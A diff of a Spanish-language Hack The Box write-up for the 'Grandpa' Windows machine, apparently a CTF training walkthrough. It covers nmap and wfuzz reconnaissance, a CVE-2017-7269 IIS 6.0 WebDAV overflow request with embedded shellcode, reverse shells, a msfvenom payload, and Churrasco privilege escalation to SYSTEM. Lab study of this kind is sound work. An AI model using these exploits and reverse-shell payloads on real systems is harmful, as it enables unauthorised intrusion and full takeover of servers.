@@ -16,14 +16,24 @@ tags:
   - IIS 6.0 WebDAV
   - Remote Buffer Overflow (RBO)
   - RBO - CVE-2017-7269
-  - Juicy Potato
-  - Churrasco
+  - System Recognition (Windows)
+  - Local Privilege Escalation (LPE)
+  - LPE - Churrasco Token Kidnapping
   - Reverse Shell
   - OSCP Style
 ---
 ![](/assets/images/htb-writeup-grandpa/grandpa_logo.png)
 
-Esta fue una máquina fácil en la cual vamos a vulnerar el servicio HTTP del puerto 80, que está usando **Microsoft IIS 6.0 WebDAV**, usando un Exploit que nos conectara de forma remota a la máquina **(CVE-2017-7269)**, de ahi podemos escalar privilegios a **NT Authority System** aprovechando que tenemos el privilegio **SeImpersonatePrivilege**, justamente usando **Churrasco.exe** (una variante de **Juicy Potato** para sistemas Windows viejos) y utilizando un Payload.
+Esta fue una máquina fácil en la cual vamos a vulnerar el **servicio HTTP** del **puerto 80**, que está usando **Microsoft IIS 6.0 WebDAV**, usando un Exploit que nos conectara de forma remota a la máquina **(CVE-2017-7269)**, de ahi podemos escalar privilegios a **NT Authority System** aprovechando que tenemos el privilegio **SeImpersonatePrivilege**, justamente usando **Churrasco.exe** (una variante de **Juicy Potato** para sistemas Windows viejos) y utilizando un Payload.
+
+Herramientas utilizadas:
+* *nc*
+* *wappalizer*
+* *wfuzz*
+* *python 2*
+* *windows-exploit-suggester.py*
+* *msfvenom*
+* *impacket*
 
 
 <br>
@@ -36,16 +46,21 @@ Esta fue una máquina fácil en la cual vamos a vulnerar el servicio HTTP del pu
 				<li><a href="#Ping">Traza ICMP</a></li>
 				<li><a href="#Puertos">Escaneo de Puertos</a></li>
 				<li><a href="#Servicios">Escaneo de Servicios</a></li>
+				<li><a href="#HTTP">Analizando Servicio HTTP</a></li>
 			</ul>
 		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#HTTP">Analizando Puerto 80</a></li>
 				<li><a href="#Fuzz">Fuzzing</a></li>
+				<li><a href="#Inv">Investigando Alguna Vulnerabilidad para el Servicio Microsoft IIS httpd 6.0</a></li>
 			</ul>
 		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
+			<ul>
+				<li><a href="#Exploit">Probando Variante de Exploit: Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow</a></li>
+			</ul>
 		<li><a href="#Post">Post Explotación</a></li>
 			<ul>
-				<li><a href="#Windows">Enumeración de Windows</a></li>
+				<li><a href="#Windows">Enumeración de Máquina</a></li>
+				<li><a href="#Churro">Escalando Privilegios con Churrasco</a></li>
 			</ul>
 		<li><a href="#Links">Links de Investigación</a></li>
 		<li><a href="#Nota">Nota Final</a></li>
@@ -68,7 +83,7 @@ Esta fue una máquina fácil en la cual vamos a vulnerar el servicio HTTP del pu
 <h2 id="Ping">Traza ICMP</h2>
 
 Vamos a lanzar un ping para ver si la máquina está conectada y en base al TTL veamos contra que SO nos enfrentamos.
-```
+```bash
 ping -c 4 10.10.10.14 
 PING 10.10.10.14 (10.10.10.14) 56(84) bytes of data.
 64 bytes from 10.10.10.14: icmp_seq=1 ttl=127 time=131 ms
@@ -84,7 +99,7 @@ Por el TTL sabemos que la máquina usa Windows. Es momento de hacer los escaneos
 
 <h2 id="Puertos">Escaneo de Puertos</h2>
 
-```
+```bash
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.14 -oG allPorts
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-18 18:33 CST
@@ -104,20 +119,23 @@ Read data files from: /usr/bin/../share/nmap
 Nmap done: 1 IP address (1 host up) scanned in 28.40 seconds
            Raw packets sent: 131087 (5.768MB) | Rcvd: 24 (1.056KB)
 ```
-* -p-: Para indicarle un escaneo en ciertos puertos.
-* --open: Para indicar que aplique el escaneo en los puertos abiertos.
-* -sS: Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.
-* --min-rate: Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).
-* -vvv: Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.
-* -n: Para indicar que no se aplique resolución dns para agilizar el escaneo.
-* -Pn: Para indicar que se omita el descubrimiento de hosts.
-* -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.
 
-Solamente hay un puerto abierto, el HTTP lo que nos dice que tiene una página web abierta, aun así, veamos qué servicio corre.
+| Parámetros | Descripción |
+|--------------------------|
+| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
+| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
+| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
+| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
+| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
+| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
+| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
+| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |
+
+Solamente hay un puerto abierto, el **servicio HTTP** lo que nos dice que tiene una página web abierta, aun así, veamos qué servicio corre.
 
 <h2 id="Servicios">Escaneo de Servicios</h2>
 
-```
+```bash
 nmap -sC -sV -p80 10.10.10.14 -oN targeted                              
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-18 18:34 CST
 Nmap scan report for 10.10.10.14
@@ -140,12 +158,29 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 13.05 seconds
 ```
-* -sC: Para indicar un lanzamiento de scripts básicos de reconocimiento.
-* -sV: Para identificar los servicios/versión que están activos en los puertos que se analicen.
-* -p: Para indicar puertos específicos.
-* -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.
 
-Mmmmm usa un **Microsoft IIS httpd 6.0**, ya nos hemos enfrentado a algo similar, pero en este caso no hay ningún **servicio FTP**. Es momento de analizar la página web.
+| Parámetros | Descripción |
+|--------------------------|
+| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
+| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
+| *-p*       | Para indicar puertos específicos. |
+| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |
+
+Esta usando un **servicio Microsoft IIS httpd 6.0**, ya nos hemos enfrentado a algo similar, pero en este caso no hay ningún **servicio FTP** que podamos usar para aprovecharnos de este servicio. Es momento de analizar la página web.
+
+<h2 id="HTTP">Analizando Servicio HTTP</h2>
+
+Primero entremos a la página web:
+
+![](/assets/images/htb-writeup-grandpa/Captura1.png)
+
+No veo nada que nos pueda ayudar. Veamos lo que nos dice el **Wappalizer**.
+
+<p align="center">
+<img src="/assets/images/htb-writeup-grandpa/Captura2.png">
+</p>
+
+Nada, no veo nada que nos ayude. Intentemos hacer **Fuzzing** para ver si puede encontrar algo, aunque lo dudo bastante.
 
 
 <br>
@@ -160,23 +195,9 @@ Mmmmm usa un **Microsoft IIS httpd 6.0**, ya nos hemos enfrentado a algo similar
 <br>
 
 
-<h2 id="HTTP">Analizando Puerto 80</h2>
-
-Primero entremos a la página web:
-
-![](/assets/images/htb-writeup-grandpa/Captura1.png)
-
-No veo nada que nos pueda ayudar. Veamos lo que nos dice el **Wappalizer**.
-
-<p align="center">
-<img src="/assets/images/htb-writeup-grandpa/Captura2.png">
-</p>
-
-Nada, no veo nada que nos ayude. Intentemos hacer **Fuzzing** para ver si puede encontrar algo, aunque lo dudo bastante.
-
 <h2 id="Fuzz">Fuzzing</h2>
 
-```
+```bash
 wfuzz -c --hc=404,302 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.14/FUZZ/   
  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 ********************************************************
@@ -215,27 +236,38 @@ Processed Requests: 220560
 Filtered Requests: 220541
 Requests/sec.: 341.8143
 ```
-* -c: Para que se muestren los resultados con colores.
-* --hc: Para que no muestre el código de estado 404, hc = hide code.
-* -t: Para usar una cantidad específica de hilos.
-* -w: Para usar un diccionario de wordlist.
-* Diccionario que usamos: dirbuster
+
+| Parámetros | Descripción |
+|--------------------------|
+| *-c*       | Para ver el resultado en un formato colorido. |
+| *--hc*     | Para no mostrar un código de estado en los resultados. |
+| *-t*       | Para indicar la cantidad de hilos a usar. |
+| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
+
+<br>
 
 No pues nada, vamos directamente a buscar un Exploit para el servicio **Microsoft IIS httpd 6.0**.
-```
+
+<h2 id="Inv">Investigando Alguna Vulnerabilidad para el Servicio Microsoft IIS httpd 6.0</h2>
+
+```bash
 searchsploit Microsoft IIS httpd 6.0
 Exploits: No Results
 Shellcodes: No Results
 Papers: No Results
 ```
-Jajaja no pues no, busquemos por internet.
+Igual, nada. Busquemos por internet, haber si encontramos una vulnerabilidad.
 
-Encontré el siguiente Exploit aunque menciona algo llamado **WebDAV**, no sé qué sea, vamos a investigarlo y luego analizamos el Exploit.
+Encontré el siguiente Exploit aunque menciona algo llamado **WebDAV**, vamos a investigarlo y luego analizamos el Exploit.
 
-**WebDAV es un grupo de trabajo del Internet Engineering Task Force. El término significa "Autoría y versionado distribuidos por Web", y se refiere al protocolo que el grupo definió. El objetivo de WebDAV es hacer de la World Wide Web un medio legible y editable, en línea con la visión original de Tim Berners-Lee.**
+| **Servicio WebDAV** |
+|:-----------:|
+| *WebDAV es un grupo de trabajo del Internet Engineering Task Force. El término significa "Autoría y versionado distribuidos por Web", y se refiere al protocolo que el grupo definió. El objetivo de WebDAV es hacer de la World Wide Web un medio legible y editable, en línea con la visión original de Tim Berners-Lee.* |
+
+<br>
 
 Ok, ya sabemos que es, ahora veamos el Exploit.
-```
+```bash
 searchsploit Microsoft IIS 6.0 WebDAV
 ----------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                             |  Path
@@ -264,10 +296,14 @@ Hay varios, pero vamos a probar el que encontramos por internet que es el primer
 <br>
 
 
+<h2 id="Exploit">Probando Variante de Exploit: Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow</h2>
+
 **ADVERTENCIA**: 
 
-Este Exploit me jodio la máquina varias veces porque probe distintos Exploits para escalar privilegios, ten cuidado porque si tienes que salirte forzosamente usando **crtl + c** desde dentro de la máquina, tendrás que reiniciarla, o al menos eso me paso a mi porque el servicio HTTP del puerto 80 dejo de funcionar.
-```
+Este Exploit me jodio la máquina varias veces porque probe distintos Exploits para escalar privilegios, ten cuidado porque si tienes que salirte forzosamente usando **crtl + c** desde dentro de la máquina, tendrás que reiniciarla desde **HackTheBox**, o al menos eso me paso a mi porque el **servicio HTTP** del puerto 80 dejo de funcionar.
+
+Vamos a copiarnos el Exploit en nuestra estación de trabajo:
+```bash
 searchsploit -x windows/remote/41738.py  
   Exploit: Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow
       URL: https://www.exploit-db.com/exploits/41738
@@ -276,50 +312,53 @@ searchsploit -x windows/remote/41738.py
  Verified: False
 File Type: ASCII text, with very long lines (2183)
 ```
-Mmmmm no entiendo muy bien cómo usarlo, podría ser que debemos meter los datos de la página web y un localhost o algo así. Creo que será mejor buscar como usar este Exploit antes de utilizar otro.
+No entiendo muy bien cómo usarlo, podría ser que debemos meter los datos de la página web y un localhost o algo así. Creo que será mejor buscar como usar este Exploit o una variante de este, antes de utilizar otro.
 
 Investigando un poco, nos aparece este GitHub:
 
 * https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269
 
-Ahí viene el mismo que vamos a ocupar, pero ya nos explica que debemos poner para poder usarlo:
-```
+Este es una variante del Exploit anterior, observa como se usa:
+```python
 if len(sys.argv)<5:
     print 'usage:iis6webdav.py targetip targetport reverseip reverseport\n'
     exit(1)
 ```
 
 Así que vamos a descargarlo.
-```
+```bash
 git clone https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269.git  
 Clonando en 'iis6-exploit-2017-CVE-2017-7269'...
 remote: Enumerating objects: 6, done.
 remote: Total 6 (delta 0), reused 0 (delta 0), pack-reused 6
 Recibiendo objetos: 100% (6/6), listo.
 ```
-Y ahora vamonos por pasos.
+Y ahora lo usamos, vamonos por pasos.
 
 * Levantemos una netcat:
-```
+```bash
 nc -nvlp 443                         
 listening on [any] 443 ...
 ```
+
 * Renombremos el Exploit para que sea **.py**:
-```
+```bash
 mv iis6\ reverse\ shell IIS6_Exploit.py
 ls
 IIS6_Exploit.py  README.md
 ```
+
 * Probemos el Exploit:
-```
+```bash
 python2 IIS6_Exploit.py 10.10.10.14 80 10.10.14.14 443
 PROPFIND / HTTP/1.1
 Host: localhost
 Content-Length: 1744
 If: <http://localhost/aaaaaaa潨硣睡焳椶䝲稹䭷佰畓穏䡨噣浔桅㥓偬啧杣㍤䘰硅楒吱䱘橑牁䈱瀵塐㙤汇㔹呪倴呃睒偡㈲测水㉇扁㝍兡塢䝳剐㙰畄桪㍴乊硫䥶乳䱪坺潱塊㈰㝮䭉前䡣潌畖畵景癨䑍偰稶手敗畐橲穫睢癘扈攱ご汹偊呢倳㕷橷䅄㌴摶䵆噔䝬敃瘲牸坩䌸扲娰夸呈ȂȂዀ栃汄剖䬷汭佘塚祐䥪塏䩒䅐晍Ꮐ栃䠴攱潃湦瑁䍬Ꮐ栃千橁灒㌰塦䉌灋捆关祁穐䩬> (Not <locktoken:write1>) <http://localhost/bbbbbbb祈慵佃潧歯䡅㙆杵䐳㡱坥婢吵噡楒橓兗㡎奈捕䥱䍤摲㑨䝘煹㍫歕浈偏穆㑱潔瑃奖潯獁㑗慨穲㝅䵉坎呈䰸㙺㕲扦湃䡭㕈慷䵚慴䄳䍥割浩㙱乤渹捓此兆估硯牓材䕓穣焹体䑖漶獹桷穖慊㥅㘹氹䔱㑲卥塊䑎穄氵婖扁湲昱奙吳ㅂ塥奁煐〶坷䑗卡Ꮐ栃湏栀湏栀䉇癪Ꮐ栃䉗佴奇刴䭦䭂瑤硯悂栁儵牺瑺䵇䑙块넓栀ㅶ湯ⓣ栁ᑠ栃翾￿￿Ꮐ栃Ѯ栃煮瑰ᐴ栃⧧栁鎑栀㤱普䥕げ呫癫牊祡ᐜ栃清栀眲票䵩㙬䑨䵰艆栀䡷㉓ᶪ栂潪䌵ᏸ栃⧧栁VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJINDKSKPKPTKKQTKT0D8TKQ8RTJKKX1OTKIGJSW4R0KOIBJHKCKOKOKOF0V04PF0M0A>
 ```
+
 * Y estamos dentro:
-```
+```bash
 nc -nvlp 443                         
 listening on [any] 443 ...
 connect to [10.10.14.14] from (UNKNOWN) [10.10.10.14] 1030
@@ -329,7 +368,7 @@ c:\windows\system32\inetsrv>whoami
 whoami
 nt authority\network service
 ```
-¿Que? ¿Ya somos Root? Pues nel no te emociones, somo Root pero en el servicio de la red, lo cual no nos ayuda mucho. Vamos a ver que hay dentro de la máquina.
+¿Qué? ¿Ya somos Root? Pues no, no te emociones, somo Root pero en el servicio de la red, lo cual no nos ayuda mucho. Vamos a ver que hay dentro de la máquina.
 
 
 <br>
@@ -344,9 +383,9 @@ nt authority\network service
 <br>
 
 
-<h2 id="Windows">Enumeración de Windows</h2>
+<h2 id="Windows">Enumeración de Máquina</h2>
 
-```
+```shell
 c:\windows\system32\inetsrv>cd C:\
 cd C:\
 C:\>dir
@@ -366,8 +405,9 @@ dir
                2 File(s)              0 bytes
                7 Dir(s)   1,296,433,152 bytes free
 ```
-Hay algunas carpetas que podrian contener algo, veámoslas:
-```
+
+Hay algunos directorios que podrian contener algo, veámoslas:
+```shell
 C:\>cd ADFS
 cd ADFS
 C:\ADFS>dir
@@ -382,8 +422,9 @@ dir
 C:\ADFS>cd ..
 cd ..
 ```
-No hay nada.
-```
+
+No hay nada. Sigamos buscando:
+```shell
 C:\>cd FPSE_search
 cd FPSE_search
 C:\FPSE_search>dir
@@ -398,8 +439,9 @@ dir
 C:\FPSE_search>cd ..
 cd ..
 ```
-Nada de nada.
-```
+
+Nada de nada. Veamos que más hay:
+```shell
 C:\>cd Documents and Settings
 cd Documents and Settings
 
@@ -422,8 +464,10 @@ C:\Documents and Settings>cd Harry
 cd Harry
 Access is denied.
 ```
-Aquí está el usuario y el administrador, aquí ya se aclara que no somos ni usuario. Veamos que privilegios tenemos y la información del sistema.
-```
+Aquí está el usuario y el administrador, aquí ya se aclara que no somos ni usuario. 
+
+Veamos que privilegios tenemos y la información del sistema.
+```shell
 C:\Documents and Settings>whoami /priv
 whoami /priv
 
@@ -439,8 +483,10 @@ SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
 SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
 SeCreateGlobalPrivilege       Create global objects                     Enabled
 ```
-Uffff tenemos el **SeImpersonatePrivilege**, veamos el sistema:
-```
+Tenemos el **SeImpersonatePrivilege**.
+
+Veamos la información del sistema:
+```shell
 C:\Documents and Settings>systeminfo
 systeminfo
 
@@ -453,8 +499,9 @@ OS Build Type:             Uniprocessor Free
 Registered Owner:          HTB
 Registered Organization:   HTB
 ```
+
 Muy bien, aquí podemos usar nuestra herramienta **Windows Exploit Suggester**, aprovechemosla y veamos que nos dice:
-```
+```shell
 python2 windows-exploit-suggester.py --database 2023-03-30-mssb.xls -i sysinfo.txt
 [*] initiating winsploit version 3.3...
 [*] database file detected as xls or xlsx based on extension
@@ -471,9 +518,7 @@ python2 windows-exploit-suggester.py --database 2023-03-30-mssb.xls -i sysinfo.t
 [*]   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF
 ...
 ```
-Salen varias opciones, pero no vamos a probar ninguno, ¿por qué? por mis huevos, ¿como ves perro?
-
-Jajajaja no es cierto, esto es porque después de casi 3 horas de probar varios Exploits y en lo que tenía que reiniciar la máquina varias veces como mencione antes. ¡NO FUNCIONO NINGUNO!
+Salen varias opciones, pero no vamos a probar ninguno, esto es porque después de casi 3 horas de probar varios Exploits y en lo que tenía que reiniciar la máquina varias veces como mencione antes. ¡NO FUNCIONO NINGUNO!
 
 Los que probe fueron:
 * MS14-070 - Ambas versiones
@@ -482,6 +527,9 @@ Los que probe fueron:
 * MS15-051
 
 No sé porque razón ninguno funciono, así que en este caso ahora si vamos a aprovecharnos del privilegio **SeImpersonatePrivilege**. Para abusar de este privilegio vamos a usar **Juicy Potato**, pero esta será una variante pues la versión de **Windows** de la máquina es bastante vieja.
+
+
+<h2 id="Churro">Escalando Privilegios con Churrasco</h2>
 
 Con solo poner **Windows server 2003 juicy potato exploit** en el buscador, nos dará una página web, la abrimos y vemos la explicación.
 
@@ -494,20 +542,20 @@ La versión de **Juicy Potato** que ofrece esta página no nos servirá, pero si
 Siguiendo las indicaciones de la página, una vez descargado el **Churrasco.exe** vamos a hacer lo siguiente:
 
 * Crearemos un Payload para cargar una Reverse Shell:
-```
+```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=Tu_IP LPORT=1337 EXITFUNC=thread -f exe -a x86 --platform windows -o shell.exe
 No encoder specified, outputting raw payload
 Payload size: 324 bytes
 Final size of exe file: 73802 bytes
 Saved as: shell.exe
 ```
-**OJO**: 
 
+**OJO**: 
 Ten cuidado y no vayas a usar el mismo puerto que usaste para acceder a la máquina porque sigue en activo.
 
 * Abrimos un servidor con Impacket para subir el Payload y el Churrasco:
-```
-mpacket-smbserver smbFolder $(pwd)
+```bash
+impacket-smbserver smbFolder $(pwd)
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [*] Config file parsed
 [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
@@ -516,8 +564,9 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [*] Config file parsed
 [*] Config file parsed
 ```
+
 * Descargamos los archivos en la máquina:
-```
+```shell
 C:\WINDOWS\Temp\Privesc>copy \\Tu_IP\smbFolder\churrasco.exe churrasco.exe
 copy \\Tu_IP\smbFolder\churrasco.exe churrasco.exe
         1 file(s) copied.
@@ -528,12 +577,13 @@ copy \\Tu_IP\smbFolder\shell.exe shell.exe
 **NOTA**: Esta vez no usamos **certutil.exe** porque no funciona tampoco.
 
 * Activamos una netcat con el puerto que pusimos en el Payload:
-```
+```bash
 nc -nvlp 1337
 listening on [any] 1337 ...
 ```
+
 * Una vez dentro ambos archivos, activamos el Churrasco:
-```
+```shell
 C:\WINDOWS\Temp\Privesc>churrasco.exe -d "C:\WINDOWS\Temp\Privesc\shell.exe"
 churrasco.exe -d "C:\WINDOWS\Temp\Privesc\shell.exe"
 /churrasco/-->Current User: NETWORK SERVICE 
@@ -551,8 +601,9 @@ churrasco.exe -d "C:\WINDOWS\Temp\Privesc\shell.exe"
 /churrasco/-->Running command with SYSTEM Token...
 /churrasco/-->Done, command should have ran as SYSTEM!
 ```
+
 * Y ya somo Root:
-```
+```bash
  nc -nvlp 1337
 listening on [any] 1337 ...
 connect to [10.10.14.14] from (UNKNOWN) [10.10.10.14] 1035
